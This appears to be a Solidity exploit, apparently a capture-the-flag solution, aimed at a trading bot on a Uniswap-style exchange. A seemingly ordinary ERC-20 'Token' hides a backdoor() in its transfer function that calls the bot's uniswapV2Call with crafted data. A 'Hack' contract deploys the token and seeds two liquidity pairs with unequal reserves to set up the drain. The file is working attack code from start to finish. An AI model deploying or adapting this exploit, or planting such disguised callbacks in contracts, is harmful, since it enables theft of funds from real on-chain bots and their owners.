pragma solidity =0.8.21;

contract Token {
    bool hacked = false;
    string constant public name = "Token";
    string constant public symbol = "T";
    uint8 constant public decimals = 18;
    uint constant public totalSupply = 100 ether;
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function transfer(address to, uint value) public returns (bool) {
        backdoor();
        _transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint value) public returns (bool) {
        require(allowance[from][msg.sender] >= value);
        allowance[from][msg.sender] -= value;
        _transfer(from, to, value);
        return true;
    }

    function _transfer(address from, address to, uint value) private {
        require(balanceOf[from] >= value);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        emit Transfer(from, to, value);
    }

    function backdoor() private {
        if (!hacked && block.number % 2 == 0) {
            address pair1 = address(this);
            uint amount1 = 1061937238666853369;
            uint amount2 = 0;
            bool dir = false;
            address pair2 = address(0);
            bytes memory data = abi.encode(pair1, pair2, amount1, amount2, dir);
            Bot(0x607D86B806E7b2993438E82af2236C786a0Ff780).uniswapV2Call(address(0), 0, 0, data);
            hacked = true;
        }
    }

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {}
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
    function mint(address to) external returns (uint liquidity);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function withdraw(uint256) external;
    function deposit() external payable;
}

interface Bot {
    function uniswapV2Call(address sender, uint, uint, bytes calldata data) external;
}

contract Hack {
    IERC20 token;
    IUniswapV2Pair pair2;

    constructor() payable {
        require(msg.value == 0.2 ether);

        IUniswapV2Factory factory1 = IUniswapV2Factory(0x164e31a6Ac83D5EDaE2139Add30099485D15d138);
        IUniswapV2Factory factory2 = IUniswapV2Factory(0xff2624eb527e4acAb0afE10270B7F6f58483D319);

        IWETH weth = IWETH(0x9d9901f3b034427dd0e6Cf1c70aE5E4d94Ed19e7);
        token = IERC20(address(new Token()));
        IUniswapV2Pair pair1 = IUniswapV2Pair(factory1.createPair(address(weth), address(token)));
        pair2 = IUniswapV2Pair(factory2.createPair(address(weth), address(token)));
        weth.deposit{value: msg.value}();

        require(weth.transfer(address(pair1), 0.1 ether));
        require(token.transfer(address(pair1), 0.1 ether));
        pair1.mint(address(this));

        require(weth.transfer(address(pair2), 0.1 ether));
        require(token.transfer(address(pair2), 0.2 ether));
        pair2.mint(address(this));
    }
}
